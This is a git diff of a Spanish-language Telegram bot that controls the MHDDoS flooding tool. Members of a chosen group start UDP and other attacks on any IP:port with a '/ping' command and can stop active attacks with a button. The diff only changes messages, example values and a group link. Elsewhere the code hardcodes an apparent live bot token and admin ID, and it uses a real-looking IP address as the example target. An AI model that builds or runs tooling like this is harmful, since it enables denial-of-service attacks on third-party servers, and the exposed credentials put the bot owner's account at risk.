@@ -8,6 +8,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
 ADMIN_ID = 6348583777
 GROUP_ID = -1002260050481  # Reemplaza con el ID real de tu grupo
+GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -15,19 +16,16 @@ db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
 
-
 @atexit.register
 def close_db_connection():
     pass  # No hay conexión de base de datos que cerrar
-
 
 def is_allowed(message):
     """ Verifica si el mensaje proviene del grupo permitido o si es del admin en privado. """
     if message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
         return True
-    bot.reply_to(message, "❌ Este bot solo funciona en este grupo en específico.")
+    bot.reply_to(message, "❌ Este bot solo funciona en un grupo en específico.\n🔗 Únete a este grupo para poder utilizar este bot: " + GROUP_LINK)
     return False
-
 
 @bot.message_handler(commands=["start"])
 def handle_start(message):
@@ -55,7 +53,6 @@ def handle_start(message):
         parse_mode="Markdown",
     )
 
-
 @bot.message_handler(commands=["ping"])
 def handle_ping(message):
     if not is_allowed(message):
@@ -77,7 +74,7 @@ def handle_ping(message):
                 "📌 *Uso correto:*\n"
                 "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                 "💡 *Ejemplo:*\n"
-                "`/ping UDP 143.92.125.230:10013 10 900`"
+                "`/ping UDP 143.92.125.230:10013 3 120`"
             ),
             parse_mode="Markdown",
         )
@@ -106,14 +103,13 @@ def handle_ping(message):
                 f"🧵 *Threads:* {threads}\n"
                 f"⏳ *Tempo (ms):* {duration}\n"
                 f"💻 *Comando ejecutado:* `ping`\n\n"
-                f"*⚠️ Atención! Este bot fue creado por* https://t.me/xFernandoh"
+                f"*⚠️ Atención! Este bot fue creado por*@xFernandoh"
             ),
             reply_markup=markup,
             parse_mode="Markdown",
         )
     except Exception as e:
         bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
-
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def handle_stop_attack(call):
@@ -141,7 +137,6 @@ def handle_stop_attack(call):
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
         bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")
-
 
 if __name__ == "__main__":
     bot.infinity_polling()
